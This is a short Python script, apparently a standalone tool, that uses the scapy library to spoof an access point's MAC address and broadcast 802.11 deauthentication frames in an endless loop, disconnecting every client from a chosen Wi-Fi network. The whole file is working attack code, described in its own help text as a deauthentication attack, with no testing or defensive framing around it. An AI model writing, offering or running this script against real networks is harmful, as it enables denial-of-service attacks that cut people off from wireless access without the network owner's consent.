import argparse
from scapy.all import *

# Function to send deauth packets to disconnect all clients from the AP
def send_deauth(ap_mac, interface):
    # Broadcast address for deauthentication
    broadcast_mac = 'ff:ff:ff:ff:ff:ff'
    
    # Construct a basic 802.11 deauthentication frame
    dot11 = Dot11(addr1=broadcast_mac, addr2=ap_mac, addr3=ap_mac)
    packet = RadioTap()/dot11/Dot11Deauth()
    
    # Send the packet endlessly
    sendp(packet, iface=interface, verbose=False)

# Main function to parse arguments and run the deauth attack
def main():
    parser = argparse.ArgumentParser(description="Deauthentication attack script to disconnect all clients")
    parser.add_argument('--deauth', type=int, default=0, help="Deauth mode (0 to enable)")
    parser.add_argument('-a', '--ap', required=True, help="MAC address of the Access Point (AP)")
    parser.add_argument('-i', '--interface', required=True, help="Network interface to use")

    args = parser.parse_args()

    if args.deauth == 0:
        print("Starting deauthentication attack to disconnect all clients. Press Ctrl+C to stop.")
        try:
            while True:
                send_deauth(ap_mac=args.ap, interface=args.interface)
        except KeyboardInterrupt:
            print("\nDeauthentication attack stopped.")
    else:
        print("Invalid argument for --deauth. Set it to 0 to start the attack.")

if __name__ == "__main__":
    main()
